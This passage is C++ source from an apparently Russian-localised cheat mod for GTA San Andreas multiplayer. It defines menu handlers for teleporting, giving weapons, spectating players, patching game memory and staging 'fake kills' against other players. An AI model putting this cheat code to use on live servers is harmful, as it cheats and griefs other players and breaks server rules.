 
#include "main.h"
#include <locale.h>
#include "windows.h"


 
TwBar *twBar_Main;

TwBar *twBar_Testing;
TwBar *twBar_Testing1;
TwBar *twBar_Testing2;
TwBar *twBar_Testing3;
TwBar *twBar_Testing4;
TwBar *twBar_Testing5;
TwBar *twBar_Testing6;
TwBar *twBar_Interface;
TwBar *twBar_SPCheats;
TwBar *twBar_SPCarUpgrades;
TwBar *twBar_SPCarColorPJ;
TwBar *twBar_SPWeapons;
TwBar *twBar_SPVehicles;
TwBar *twBar_SPTeleports;
TwBar *twBar_SPMisc;
TwBar *twBar_SPPatches;
TwBar *twBar_SAMPRP;
TwBar *twBar_NEWCHEATS;
TwBar *twBar_TEST;
TwBar *twBar_PRIVATE;


TwBar *twBar_SAMPPlayers;
TwBar *twBar_SAMPFavServers;
TwBar *twBar_SAMPMisc;
TwBar *twBar_SAMPSelTP;
TwBar *twBar_SAMPSelPlayer;
TwBar *twBar_SAMPInvPlayer;
TwBar *twBar_ARP;
TwBar *twBar_SAMPObjects;
TwBar *twBar_SAMPPickups;
TwBar *twBar_SAMPPatches;
std::string s3 = "a STL string";
void runNewMenu()
{
	if(KEY_PRESSED(set.key_menu))
	{
		if(gta_menu_active()) return;
		cheat_state->_generic.menu ^= 1;
		if(cheat_state->_generic.menu)
			toggleCursor(true);
		else
			toggleCursor(false);
	}
}
const char s1[64] = "a static string";
// MAIN MENU LINKERS

void TW_CALL testingMenuLinker(void *) 
{ 
    if(TwIsBarMinimized(twBar_Testing)) 
     TwMaximizeBar(twBar_Testing); 
    else 
     TwMinimizeBar(twBar_Testing); 
}
void TW_CALL testing1MenuLinker(void *) 
{ 
    if(TwIsBarMinimized(twBar_Testing1)) 
     TwMaximizeBar(twBar_Testing1); 
    else 
     TwMinimizeBar(twBar_Testing1); 
}
void TW_CALL testing2MenuLinker(void *) 
{ 
    if(TwIsBarMinimized(twBar_Testing2)) 
     TwMaximizeBar(twBar_Testing2); 
    else 
     TwMinimizeBar(twBar_Testing2); 
}
void TW_CALL testing3MenuLinker(void *) 
{ 
    if(TwIsBarMinimized(twBar_Testing3)) 
     TwMaximizeBar(twBar_Testing3); 
    else 
     TwMinimizeBar(twBar_Testing3); 
}
void TW_CALL testing4MenuLinker(void *) 
{ 
    if(TwIsBarMinimized(twBar_Testing4)) 
     TwMaximizeBar(twBar_Testing4); 
    else 
     TwMinimizeBar(twBar_Testing4); 
}
void TW_CALL testing5MenuLinker(void *)
{
	if (TwIsBarMinimized(twBar_Testing5))
		TwMaximizeBar(twBar_Testing5);
	else
		TwMinimizeBar(twBar_Testing5);
}
void TW_CALL testing6MenuLinker(void *)
{
	if (TwIsBarMinimized(twBar_Testing6))
		TwMaximizeBar(twBar_Testing6);
	else
		TwMinimizeBar(twBar_Testing6);
}
void TW_CALL cheatsMenuLinker(void *)
{
	if(TwIsBarMinimized(twBar_SPCheats))
		TwMaximizeBar(twBar_SPCheats);
	else
		TwMinimizeBar(twBar_SPCheats);
}
void TW_CALL interfaceMenuLinker(void *)
{
	if(TwIsBarMinimized(twBar_Interface))
		TwMaximizeBar(twBar_Interface);
	else
		TwMinimizeBar(twBar_Interface);
}

void TW_CALL carUpgradesMenuLinker(void *)
{
	if(TwIsBarMinimized(twBar_SPCarUpgrades))
		TwMaximizeBar(twBar_SPCarUpgrades);
	else
		TwMinimizeBar(twBar_SPCarUpgrades);
}
void TW_CALL carColorPaintjobLinker(void *)
{
	if(TwIsBarMinimized(twBar_SPCarColorPJ))
		TwMaximizeBar(twBar_SPCarColorPJ);
	else
		TwMinimizeBar(twBar_SPCarColorPJ);
}
void TW_CALL weaponsMenuLinker(void *)
{
	if(TwIsBarMinimized(twBar_SPWeapons))
		TwMaximizeBar(twBar_SPWeapons);
	else
		TwMinimizeBar(twBar_SPWeapons);
}
void TW_CALL vehiclesMenuLinker(void *)
{
	if(TwIsBarMinimized(twBar_SPVehicles))
		TwMaximizeBar(twBar_SPVehicles);
	else
		TwMinimizeBar(twBar_SPVehicles);
}
void TW_CALL teleportsMenuLinker(void *)
{
	if(TwIsBarMinimized(twBar_SPTeleports))
		TwMaximizeBar(twBar_SPTeleports);
	else
		TwMinimizeBar(twBar_SPTeleports);
}
void TW_CALL GTAMiscMenuLinker(void *)
{
	if(TwIsBarMinimized(twBar_SPMisc))
		TwMaximizeBar(twBar_SPMisc);
	else
		TwMinimizeBar(twBar_SPMisc);
}
void TW_CALL GTAPatchesMenuLinker(void *)
{
	if(TwIsBarMinimized(twBar_SPPatches))
		TwMaximizeBar(twBar_SPPatches);
	else
		TwMinimizeBar(twBar_SPPatches);
}

void TW_CALL playersMenuLinker(void *)
{
	if(TwIsBarMinimized(twBar_SAMPPlayers))
		TwMaximizeBar(twBar_SAMPPlayers);
	else
		TwMinimizeBar(twBar_SAMPPlayers);
}
void TW_CALL favServersMenuLinker(void *)
{
	if(TwIsBarMinimized(twBar_SAMPFavServers))
		TwMaximizeBar(twBar_SAMPFavServers);
	else
		TwMinimizeBar(twBar_SAMPFavServers);
}
void TW_CALL SAMPMiscMenuLinker(void *)
{
	if(TwIsBarMinimized(twBar_SAMPMisc))
		TwMaximizeBar(twBar_SAMPMisc);
	else
		TwMinimizeBar(twBar_SAMPMisc);
}
void TW_CALL SAMPSelTPLink(void *)
{
	if(TwIsBarMinimized(twBar_SAMPSelTP))
		TwMaximizeBar(twBar_SAMPSelTP);
	else
		TwMinimizeBar(twBar_SAMPSelTP);
}
void TW_CALL SAMPSelPlayerLink(void *)
{
	if(TwIsBarMinimized(twBar_SAMPSelPlayer))
		TwMaximizeBar(twBar_SAMPSelPlayer);
	else
		TwMinimizeBar(twBar_SAMPSelPlayer);
}
void TW_CALL SAMPInvPlayerLink(void *)
{
	if(TwIsBarMinimized(twBar_SAMPInvPlayer))
		TwMaximizeBar(twBar_SAMPInvPlayer);
	else
		TwMinimizeBar(twBar_SAMPInvPlayer);
}
void TW_CALL sampRpLinker(void *)
{
	if(TwIsBarMinimized(twBar_SAMPRP))
		TwMaximizeBar(twBar_SAMPRP);
	else
		TwMinimizeBar(twBar_SAMPRP);
}
void TW_CALL privatelinker(void *)
{
	if(TwIsBarMinimized(twBar_PRIVATE))
		TwMaximizeBar(twBar_PRIVATE);
	else
		TwMinimizeBar(twBar_PRIVATE);
}

void TW_CALL newcheatsLinker(void *)
{
	if(TwIsBarMinimized(twBar_NEWCHEATS))
		TwMaximizeBar(twBar_NEWCHEATS);
	else
		TwMinimizeBar(twBar_NEWCHEATS);
}


void TW_CALL TESTLINK(void *)
{
	if(TwIsBarMinimized(twBar_TEST))
		TwMaximizeBar(twBar_TEST);
	else
		TwMinimizeBar(twBar_TEST);
}
void TW_CALL SAMPObjectsLinker(void *)
{
	if(TwIsBarMinimized(twBar_SAMPObjects))
		TwMaximizeBar(twBar_SAMPObjects);
	else
		TwMinimizeBar(twBar_SAMPObjects);
}
void TW_CALL SAMPPickupsLinker(void *)
{
	if(TwIsBarMinimized(twBar_SAMPPickups))
		TwMaximizeBar(twBar_SAMPPickups);
	else
		TwMinimizeBar(twBar_SAMPPickups);
}

void TW_CALL SAMPPatchesMenuLinker(void *)
{
	if(TwIsBarMinimized(twBar_SAMPPatches))
		TwMaximizeBar(twBar_SAMPPatches);
	else
		TwMinimizeBar(twBar_SAMPPatches);
}
// MAIN MENU LINKERS END

// MENU FUNCTIONS
void TW_CALL restoreHealth(void *)
{
	struct actor_info *actor = actor_info_get(ACTOR_SELF, 0);
	if(actor) actor->hitpoints = 100.00f;
}


void TW_CALL restoreArmor(void *)
{
	struct actor_info *actor = actor_info_get(ACTOR_SELF, 0);
	if(actor) actor->armor = 100.00f;
}
void TW_CALL gotoNearestEmptyCar(void *)
{
	cheat_teleport_nearest_car();
}
void TW_CALL giveJetpack(void *)
{
	gta_jetpack_give();
}
int iMenuWeaponAmmo = 30, iMenuWeaponAmmoClip = 1;
void TW_CALL giveWeapon(void *clientData)
{
	struct weapon_entry *weapon = (struct weapon_entry *)clientData;
	if(weapon == NULL) return;

	struct actor_info *actor = actor_info_get(ACTOR_SELF, ACTOR_ALIVE);
	if(actor)
	{
		if(weapon == NULL) return;

		if(set.weapon[weapon->slot] == weapon)
		{
			set.weapon[weapon->slot] = NULL;
		}
		else
		{
			set.weapon[weapon->slot] = weapon;
			gta_weapon_set(actor, set.weapon[weapon->slot]->slot, set.weapon[weapon->slot]->id, iMenuWeaponAmmo, iMenuWeaponAmmoClip);
		}
	}
}

struct stMenuVehicleStruct
{
	int iGTAVehicleID;
	uint16_t sVehicleID;
	struct vehicle_info *pVehicleInfo;
} g_menuVehicle[SAMP_VEHICLE_MAX];
void TW_CALL menuSpawnVehicle(void *clientData)
{
	struct stMenuVehicleStruct *menuinfo = (struct stMenuVehicleStruct *)clientData;
	if(menuinfo == NULL) return;
	if(menuinfo->pVehicleInfo == NULL) return;

	float pos[3];
	struct actor_info *self = actor_info_get(ACTOR_SELF, ACTOR_ALIVE);
	struct vehicle_info *info = vehicle_info_get(menuinfo->iGTAVehicleID,
         VEHICLE_ALIVE | ((cheat_state->_generic.vehicles_freeze || !cheat_state->_generic.vehicles_warp_invert) ? 0 : VEHICLE_EMPTY));

	if(info != NULL && self != NULL)
	{
		if(cheat_state->_generic.vehicles_warpinside)
		{
			if ( cheat_state->actor.air_brake )
			{
				addMessageToChatWindow( "АирБрейк должен быть отключен" );
				return;
			}

			vehicleJumper( (int)(((DWORD) info) - (DWORD) pool_vehicle->start) / 2584 );

			return;
		}

		if(cheat_state->_generic.vehicles_warp_invert)
		{
			vect3_copy(&self->base.matrix[4*3], pos);
			pos[0] += sinf(-self->fCurrentRotation) * 5.0f;
            pos[1] += cosf(-self->fCurrentRotation) * 5.0f;
            pos[2] += 0.5f;
            cheat_vehicle_teleport(info, pos, gta_interior_id_get());

            matrix_identity(menuinfo->pVehicleInfo->base.matrix);
            vect3_copy(pos, &menuinfo->pVehicleInfo->base.matrix[4*3]);
            vect3_mult(menuinfo->pVehicleInfo->speed, 0.0f, info->speed);
            info->speed[2] = 0.05f;
            vect3_mult(menuinfo->pVehicleInfo->spin, 0.0f, menuinfo->pVehicleInfo->spin);
		}
		else
		{
			vect3_copy(&menuinfo->pVehicleInfo->base.matrix[4*3], pos);
            pos[2] += 1.5f;
            cheat_teleport(pos, menuinfo->pVehicleInfo->base.interior_id);
		}
	}
	else
	{
		if(self == NULL)
		{
			cheat_state_text("Вы мерты.");
		}
		else
		{
			cheat_state_text("Нет автомобиля");
			if(vehicle_info_get(menuinfo->iGTAVehicleID, 0) == NULL)
				cheat_state_text("Нет автомобиля.");
			else if(vehicle_info_get(menuinfo->iGTAVehicleID, VEHICLE_ALIVE) == NULL)
				cheat_state_text("Автомобиль уничтожен.");
		}
	}
}

void TW_CALL menuInteriorTeleport(void *clientData)
{
	struct interiors *menuinfo = (struct interiors *)clientData;
	if(menuinfo == NULL) return;

	cheat_teleport_history_save();
	cheat_state_text( "Телепортировались к: %s.", menuinfo->interior_name );
	cheat_teleport( menuinfo->pos, menuinfo->interior_id );
}

void TW_CALL menuTeleport(void *clientData)
{
	struct settings_coord *menuinfo = (struct settings_coord *)clientData;
	if(menuinfo == NULL) return;

	cheat_teleport_history_save();
	cheat_state_text( "Телепортировались к: %s.", set.static_teleport_name[menuinfo->iMenuID] );
	cheat_teleport( menuinfo->pos, menuinfo->interior_id );
}



enum
{
	MENU_PLAYERS_ACTION_WARPTO,
	MENU_PLAYERS_ACTION_WARPTO_PLAYERS_VEHICLE,
	MENU_PLAYERS_ACTION_SPECTATEPLAYER,
	MENU_PLAYERS_ACTION_FAKEKILL,
	MENU_PLAYERS_ACTION_SHOWINFOS,
	MENU_PLAYERS_ACTION_MUTEPLAYER_ANTISPAM,
};
struct stMenuPlayerActions
{
	char *action_name;
};
struct stMenuPlayerActions g_MenuPlayerActions[7] = {
	"Телепорт к игроку",
	"Телепорт к машине игрока",
	"Наблюдение",
	"Фейк килл",
	"Информация о игроке",
	"Затычка (anti-spam)",
};
int iMenuPlayerAction = MENU_PLAYERS_ACTION_WARPTO;
extern int iViewingInfoPlayer;
int iMenuFakeKillWeaponIndex = 44, iMenuFakeKillWeaponID = -1;
void TW_CALL menuSetPlayerAction_WarpTo(void *) { iMenuPlayerAction = MENU_PLAYERS_ACTION_WARPTO; }
void TW_CALL menuSetPlayerAction_WarpToPlayerVehicle(void *) { iMenuPlayerAction = MENU_PLAYERS_ACTION_WARPTO_PLAYERS_VEHICLE; }
void TW_CALL menuSetPlayerAction_Spectate(void *) { spectatePlayer( -1 ); iMenuPlayerAction = MENU_PLAYERS_ACTION_SPECTATEPLAYER; }
void TW_CALL menuSetPlayerAction_FakeKill(void *) { iMenuPlayerAction = MENU_PLAYERS_ACTION_FAKEKILL; }
void TW_CALL menuSetPlayerAction_ShowInfos(void *) { iViewingInfoPlayer = -1; iMenuPlayerAction = MENU_PLAYERS_ACTION_SHOWINFOS; }
void TW_CALL menuSetPlayerAction_MuteAntiSpam(void *) { iMenuPlayerAction = MENU_PLAYERS_ACTION_MUTEPLAYER_ANTISPAM; }

uint16_t g_menuPlayer[SAMP_PLAYER_MAX];
void TW_CALL menuPlayerActionHandler(void *clientData)
{
	if(g_Players == NULL) return;

	uint16_t sPlayerID = *(uint16_t *)clientData;

	struct actor_info *actor = NULL;
	float pos[3];

	if(iMenuPlayerAction == MENU_PLAYERS_ACTION_WARPTO)
	{
		if(g_Players->iIsListed[sPlayerID] != 1)
		{
			addMessageToChatWindow("Игрок оффлайн.");
			return;
		}

		if(g_Players->pRemotePlayer[sPlayerID]->pPlayerData->pSAMP_Actor == NULL)
		{
			if(vect3_near_zero(g_stStreamedOutInfo.fPlayerPos[sPlayerID]))
			{
				addMessageToChatWindow("Игрок в не зоны прорисоки.");
				return;
			}

			g_stStreamedOutInfo.fPlayerPos[sPlayerID][1] += 1.0f;
			cheat_teleport(g_stStreamedOutInfo.fPlayerPos[sPlayerID], 0);

			return;
		}

		if(!getPlayerPos(sPlayerID, pos))
		{
			addMessageToChatWindow("Информация потеряна.");
			return;
		}

		if(g_Players->pRemotePlayer[sPlayerID]->pPlayerData->pSAMP_Actor != NULL)
			actor = g_Players->pRemotePlayer[sPlayerID]->pPlayerData->pSAMP_Actor->pGTA_Ped;

		if(actor != NULL && ACTOR_IS_DEAD(actor))
		{
			addMessageToChatWindow("Игрок умер.");
			return;
		}

		if(actor->vehicle)
		{
			if(cheat_state->actor.air_brake)
			{
				addMessageToChatWindow("АирБрейк должен быть отключен");
				return;
			}

			if(g_Players->pRemotePlayer[sPlayerID]->pPlayerData->bytePlayerState == PLAYER_STATE_DRIVER
				|| g_Players->pRemotePlayer[sPlayerID]->pPlayerData->bytePlayerState == PLAYER_STATE_PASSENGER)
			{
				//need car id in memory for vehicleJumper
				if ( g_Players->pRemotePlayer[sPlayerID] != NULL
					&&	 g_Players->pRemotePlayer[sPlayerID]->pPlayerData != NULL
					&&	 g_Players->pRemotePlayer[sPlayerID]->pPlayerData->pSAMP_Vehicle != NULL
					&&	 g_Players->pRemotePlayer[sPlayerID]->pPlayerData->pSAMP_Vehicle->pGTA_Vehicle != NULL )
				{
					vehicleJumper( (int)(((DWORD) g_Players->pRemotePlayer[sPlayerID]->pPlayerData->pSAMP_Vehicle->pGTA_Vehicle) -
						(DWORD) pool_vehicle->start) / 2584 );
				}
			}
			else
			{
				addMessageToChatWindow("Игрок не в машине");
				return;
			}
		}
		else
		{
			pos[1] += 1.0f;
			cheat_teleport(pos, actor->base.interior_id);
		}
	}
	else if(iMenuPlayerAction == MENU_PLAYERS_ACTION_WARPTO_PLAYERS_VEHICLE)
	{
		if ( g_Players->pRemotePlayer[sPlayerID]->pPlayerData != NULL
			&&	 g_Players->pRemotePlayer[sPlayerID]->pPlayerData->pSAMP_Actor != NULL )
			actor = g_Players->pRemotePlayer[sPlayerID]->pPlayerData->pSAMP_Actor->pGTA_Ped;
		if ( actor == NULL )
			return;
		if ( actor->vehicle == NULL )
			return;

		if ( g_Players->iIsListed[sPlayerID] != 1 )
		{
			addMessageToChatWindow( "Игрок оффлайн." );
			return;
		}

		if ( g_Players->pRemotePlayer[sPlayerID]->pPlayerData == NULL
			||	 g_Players->pRemotePlayer[sPlayerID]->pPlayerData->pSAMP_Actor == NULL )
		{
			addMessageToChatWindow( "Игрок в не зоны прорисоки." );
			return;
		}

		if ( actor->vehicle->hitpoints == 0.0f )
		{
			addMessageToChatWindow( "Автомобиль уничтожен" );
			return;
		}

		if ( cheat_state->actor.air_brake )
		{
			addMessageToChatWindow( "АирБрейк должен быть отключен" );
			return;
		}

		// if they are in a vehicle, let's GOOOO
		if ( g_Players->pRemotePlayer[sPlayerID]->pPlayerData->bytePlayerState == PLAYER_STATE_DRIVER
			||	 g_Players->pRemotePlayer[sPlayerID]->pPlayerData->bytePlayerState == PLAYER_STATE_PASSENGER )
		{
			//need car id in memory for vehicleJumper
			if ( g_Players->pRemotePlayer[sPlayerID] != NULL
				&&	 g_Players->pRemotePlayer[sPlayerID]->pPlayerData != NULL
				&&	 g_Players->pRemotePlayer[sPlayerID]->pPlayerData->pSAMP_Vehicle != NULL
				&&	 g_Players->pRemotePlayer[sPlayerID]->pPlayerData->pSAMP_Vehicle->pGTA_Vehicle != NULL )
			{
				vehicleJumper( (int)(((DWORD) g_Players->pRemotePlayer[sPlayerID]->pPlayerData->pSAMP_Vehicle->pGTA_Vehicle) -
					(DWORD) pool_vehicle->start) / 2584 );
			}
		}
		else
		{
			addMessageToChatWindow( "Игрок не в машине" );
			return;
		}
	}
	else if(iMenuPlayerAction == MENU_PLAYERS_ACTION_SPECTATEPLAYER)
	{
		struct actor_info	*self = actor_info_get( ACTOR_SELF, ACTOR_ALIVE );
		if ( g_Players == NULL )
			return;
		if ( self == NULL )
			return;

		if ( self == NULL )
		{
			addMessageToChatWindow( "Вы мертвы." );
			return;
		}
		if ( sPlayerID == -1 )
		{
			spectatePlayer( sPlayerID );
			return;
		}

		if ( g_Players->pRemotePlayer[sPlayerID] == NULL )
		{
			addMessageToChatWindow( "Игрок оффлайн." );
			return;
		}

		if ( g_Players->pRemotePlayer[sPlayerID]->pPlayerData->bytePlayerState == PLAYER_STATE_WASTED
			|| ( g_Players->pRemotePlayer[sPlayerID]->pPlayerData->bytePlayerState == PLAYER_STATE_NONE && !set.send_spec_data ) )
		{
			addMessageToChatWindow( "Слежка не возможна" );
			return;
		}

		spectatePlayer( sPlayerID );
	}
	else if(iMenuPlayerAction == MENU_PLAYERS_ACTION_FAKEKILL)
	{
		struct actor_info *info = getGTAPedFromSAMPPlayerID(sPlayerID);
		struct actor_info *self = actor_info_get(ACTOR_SELF, ACTOR_ALIVE);
		const char *errmsg = NULL;

		if(g_Players == NULL) return;
		if(g_Players->pRemotePlayer[sPlayerID] == NULL) return;

		if(info == NULL)
			errmsg = "Игрок оффлайн.";
		else if(ACTOR_IS_DEAD(info))
			errmsg = "Игрок мертв.";
		if(self == NULL)
			errmsg = "You are dead.";
		if(g_Players->pLocalPlayer->iIsSpectating)
			errmsg = "Вы наблюдаете";

		if(errmsg == NULL)
		{
			if(iMenuFakeKillWeaponID == -1)
				self->weapon_hit_type = info->weapon[info->weapon_slot].id;
			else
				self->weapon_hit_type = (uint8_t)iMenuFakeKillWeaponID;

			self->hitpoints = 0.0f;
			self->weapon_hit_by = info;
		}
		else
		{
			addMessageToChatWindow(errmsg);
		}
	}
	else if(iMenuPlayerAction == MENU_PLAYERS_ACTION_SHOWINFOS)
	{
		iViewingInfoPlayer = sPlayerID;
	}
	else if(iMenuPlayerAction == MENU_PLAYERS_ACTION_MUTEPLAYER_ANTISPAM)
	{
		if ( sPlayerID < SAMP_PLAYER_MAX && sPlayerID >= 0 )
		{
			if ( g_bPlayerMuted[sPlayerID] )
				g_iNumPlayersMuted--;
			else
				g_iNumPlayersMuted++;

			g_bPlayerMuted[sPlayerID] ^= 1;
		}
	}

		
	}


uint16_t g_menuObject[SAMP_OBJECTS_MAX];
void TW_CALL menuTeleportToObject(void *clientData)
{
	uint16_t sObjectID = *(uint16_t *)clientData;
	float	pos[3];


	if ( g_SAMP->pPools.pPool_Object == NULL )
		return;

	if ( g_SAMP->pPools.pPool_Object->iIsListed[sObjectID] != 1 )
	{
		addMessageToChatWindow( "Обьект отсутствует." );
		return;
	}

	if ( g_SAMP->pPools.pPool_Object->object[sObjectID]->pGTAObject == NULL )
	{
		addMessageToChatWindow( "Неверная информация обьекта." );
		return;
	}

	vect3_copy( &g_SAMP->pPools.pPool_Object->object[sObjectID]->pGTAObject->base.matrix[4 * 3], pos );
	pos[2] += 2.0f;
	cheat_teleport( pos, 0 );
}

uint16_t g_menuPickup[SAMP_PICKUP_MAX];
void TW_CALL menuTeleportToPickup(void *clientData)
{
	uint16_t sPickupID = *(uint16_t *)clientData;
	float	pos[3];


	if ( g_SAMP->pPools.pPool_Pickup == NULL )
		return;
	if ( g_SAMP->pPools.pPool_Pickup->pickup[sPickupID].iType == 0 )
		return;
	if ( g_SAMP->pPools.pPool_Pickup->pickup[sPickupID].iModelID == 0 )
		return;

	vect3_copy( g_SAMP->pPools.pPool_Pickup->pickup[sPickupID].fPosition, pos );
	pos[1] += 2.0f;
	cheat_teleport( pos, 0 );
}

int iMenuSpecPID = 0;
void TW_CALL specPlayer(void *)
{
	struct actor_info *self = actor_info_get(ACTOR_SELF, ACTOR_ALIVE);
	if(g_Players == NULL) return;

	if(self == NULL)
	{
		addMessageToChatWindow("Вы мертвы.");
		return;
	}

	if(g_Players->pRemotePlayer[iMenuSpecPID] == NULL)
	{
		addMessageToChatWindow("Игрок оффлайн.");
		return;
	}

	if(g_Players->pRemotePlayer[iMenuSpecPID]->pPlayerData->bytePlayerState == PLAYER_STATE_WASTED ||
		g_Players->pRemotePlayer[iMenuSpecPID]->pPlayerData->bytePlayerState == PLAYER_STATE_NONE)
	{
		addMessageToChatWindow("Вы наблюдаете");
		return;
	}

	spectatePlayer(iMenuSpecPID);
}
void TW_CALL disableSpecPlayer(void *)
{
	GTAfunc_TogglePlayerControllable(0);
	GTAfunc_LockActor(0);
	pGameInterface->GetCamera()->RestoreWithJumpCut();
}

int iDebuggingPlayer = -1;
int iMenuDebugPID = -1;
void TW_CALL debugPlayer(void *)
{
	if(g_Players == NULL) return;

	iDebuggingPlayer = iMenuDebugPID;
}
void TW_CALL disableDebugPlayer(void *)
{
	iDebuggingPlayer = -1;
}

extern int iViewingInfoPlayer;
int iMenuPlayerInfoPID = -1;
void TW_CALL displayPlayerInfo(void *)
{
	if(g_Players == NULL) return;

	iViewingInfoPlayer = iMenuPlayerInfoPID;
}
void TW_CALL disablePlayerInfos(void *)
{
	iViewingInfoPlayer = -1;
}

extern int joining_server;
void TW_CALL joinServer(void *clientData)
{
	struct fav_server server = *(struct fav_server *)clientData;

	if(!set.use_current_name) strcpy(g_Players->szLocalPlayerName, server.nickname);
	strcpy(g_SAMP->szIP, server.ip);
	g_SAMP->ulPort = server.port;
	setPassword(server.password);
	joining_server = 1;
}

void TW_CALL applyRemoveGTAPatch(void *clientData)
{
	if(clientData)
	{
		struct patch_set patch = *(struct patch_set *)clientData;

		if(patch.installed || patch.failed)
			patcher_remove(&patch);
		else
			patcher_install(&patch);
	}
}

void TW_CALL applyRemoveSAMPPatch(void *clientData)
{
 if(clientData)
 {
   int patchID = (int)clientData;
 struct patch_set *patch = &set.sampPatch[patchID];
    if(patch->failed || patch->installed)
    { //set.sampPatch[i].name
   patcher_remove(patch);
   
    }
  else
  {
   patcher_install(patch);
  
    }
 }
}


void TW_CALL SetPatchCallback(const void *value, void *clientData)
{
	if (clientData)
	{
		struct patch_set *patch = (struct patch_set *)clientData;
		if (*(bool *)value)
			patcher_install(patch);
		else
			patcher_remove(patch);
	}
}

void TW_CALL GetPatchCallback(void *value, void *clientData)
{
	if (clientData)
	{
		struct patch_set *patch = (struct patch_set *)clientData;
		*(bool *)value = patch->installed ? 1 : 0;
	}
}

TwEnumVal game_states[] = {
	{ GAMESTATE_AWAIT_JOIN, "Ждите присоединения" },
	{ GAMESTATE_RESTARTING, "Перезапуск игрового режима" },
	{ GAMESTATE_WAIT_CONNECT, "Ждать подключения" },
	{ GAMESTATE_CONNECTING, "Подключение" },
	{ GAMESTATE_CONNECTED, "Подключен" },
};
void TW_CALL changeGS(void *clientData)
{
	int iMenuGameState = *(int *)clientData;
	g_SAMP->iGameState = iMenuGameState;
}

TwEnumVal special_actions[] = {
	{ SPECIAL_ACTION_NONE, "Выкл" },
	{ SPECIAL_ACTION_DUCK, "Утка" },
	{ SPECIAL_ACTION_USEJETPACK, "ДжетПак" },
	{ SPECIAL_ACTION_ENTER_VEHICLE, "Enter vehicle" },
	{ SPECIAL_ACTION_EXIT_VEHICLE, "Exit vehicle" },
	{ SPECIAL_ACTION_DANCE1, "Танец 1" },
	{ SPECIAL_ACTION_DANCE2, "Танец 2" },
	{ SPECIAL_ACTION_DANCE3, "Танец 3" },
	{ SPECIAL_ACTION_DANCE4, "Танец 4" },
	{ SPECIAL_ACTION_HANDSUP, "Руки вверх" },
	{ SPECIAL_ACTION_USECELLPHONE, "Телефон" },
	{ SPECIAL_ACTION_SITTING, "Настройка" },
	{ SPECIAL_ACTION_STOPUSECELLPHONE, "Закончить разговор" },
	{ SPECIAL_ACTION_DRINK_BEER, "Пиво" },
	{ SPECIAL_ACTION_SMOKE_CIGGY, "Сигара" },
	{ SPECIAL_ACTION_DRINK_WINE, "Вино" },
	{ SPECIAL_ACTION_DRINK_SPRUNK, "Лимонад" },
};
void TW_CALL changeSpecialAction(void *clientData)
{
	int iMenuSpecialAction = *(int *)clientData;
	setSpecialAction(iMenuSpecialAction);
}

void TW_CALL getDrunk(void *)
{
	if ( g_Players != NULL && g_Players->pLocalPlayer != NULL && 
		g_Players->pLocalPlayer->pSAMP_Actor != NULL && 
		g_Players->pLocalPlayer->pSAMP_Actor->drunkLevel < 2300 )
	{
		if ( g_Players->pLocalPlayer->pSAMP_Actor->drunkLevel > 0 )
			g_Players->pLocalPlayer->pSAMP_Actor->drunkLevel = 0;
		else
			g_Players->pLocalPlayer->pSAMP_Actor->drunkLevel = 30000 + (rand()%2000);
	}
}

void TW_CALL loadM0dCommands(void *)
{
	if(!get_isModCommandsActive())
		init_samp_chat_cmds();
}

void TW_CALL BlinkColor(void *)
{
	if(!get_isModCommandsActive())
		init_samp_chat_cmds();
}

TwEnumVal fk_weapons[] = {
	{ 0, "Кулак" },	{ 1, "Кастет" }, { 2, "Клюшка" }, { 3, "Трость" }, { 4, "Нож" }, { 5, "Бита" },
	{ 6, "Лопата" }, { 7, "Кий" }, { 8, "Катана" }, { 9, "Бензопила" },	{ 22, "Пистолеты" }, { 23, "Пистолет с глушителем" },
	{ 24, "Дигл" }, { 25, "ШотГан" }, { 26, "Обрезы" }, { 27, "SPAZ12" }, { 28, "МикроУЗИ" },
	{ 29, "МП5" }, { 32, "Тек9" }, { 30, "AK47" },	{ 31, "M4" }, { 33, "Винтовка" }, { 34, "Снайперка" },
	{ 35, "Гранатмет" }, { 36, "Самонаводящий RPG" }, { 37, "Огнемет" },	{ 38, "Миниган" }, { 16, "Гранаты" },
	{ 17, "Газ" }, { 18, "Молотов" }, { 39, "Remote Explosives" },	{ 41, "Баллончик" }, { 42, "Огнетушитель" },
	{ 43, "Фотоапарат" }, { 10, "Дилдо 1" }, { 11, "Дилдо 2" }, { 12, "Вибратор 1" }, { 13, "Вибратор 2" }, { 14, "Цветы" }, { 15, "Трость" },
	{ 44, "NV Очки" }, { 45, "IR Очки" }, { 46, "Парашут" }, { 40, "Детонатор" }, { -1, "Использовать текущее оружие" }
};
void TW_CALL changeFakeKillWeapon(void *clientData)
{
	int iFakeKillWeaponID = *(int *)clientData;
	for(int i = 0; i < 45; i++)
	{
		if(fk_weapons[i].Value == iFakeKillWeaponID)
		{
			iMenuFakeKillWeaponIndex = i;
			iMenuFakeKillWeaponID = fk_weapons[i].Value;
		}
	}
}

void TW_CALL menuToggleWndMode(void *)
{
	toggleWindowedMode();
	toggleCursor(true);
}

void TW_CALL writeCoordToLogFile(void *)
{
	float *pos = (cheat_state->state == CHEAT_STATE_VEHICLE) ? cheat_state->vehicle.coords : cheat_state->actor.coords;
	Log("static_teleport_name[] = \"\"");
	Log("static_teleport_pos[] = %.2f %.2f %.2f   %d", pos[0], pos[1], pos[2], gta_interior_id_get());
	cheat_state_text("Current coordinates written to log file.");
}

void TW_CALL reloadSettings(void *)
{
	ini_reload();
}


void TW_CALL menuDebugHandler(void *clientData)
{
	void *pData = (void *)clientData;
	setDebugPointer(pData);

}

void TW_CALL menuAddUpgrade(void *clientData)
{
	int iUpgradeID = (int)clientData;

	struct vehicle_info *vinfo = vehicle_info_get( VEHICLE_SELF, 0 );
	if ( vinfo == NULL )
		return;

	if ( iUpgradeID >= 1000 && iUpgradeID <= 1193 )
	{
		struct actor_info	*ainfo = actor_info_get( ACTOR_SELF, 0 );
		if ( vinfo->passengers[0] != ainfo )
			return;

		int						iModelID = iUpgradeID;
		int						iUpgradeInfoID;
		vehicle_upgrade_info	upgrade_info = get_cveh_upgrade_info( iModelID, iUpgradeInfoID );
		int						iModelIDplusOne = cveh_upgrade_info[iUpgradeInfoID + 1].iModelID;
		if ( upgrade_info.upgradeCategoryName == "Sideskirt" || upgrade_info.upgradeCategoryName == "Vents" )
		{
			loadSpecificModel( iModelID );
			loadSpecificModel( iModelIDplusOne );
			vehicle_addUpgrade( vinfo, iModelID );
			vehicle_addUpgrade( vinfo, iModelIDplusOne );
		}
		else
		{
			loadSpecificModel( iModelID );
			vehicle_addUpgrade( vinfo, iModelID );
		}
	}
}

uint8_t bCurrentPJ = 3;
void TW_CALL menuChangePaintjob(void *)
{
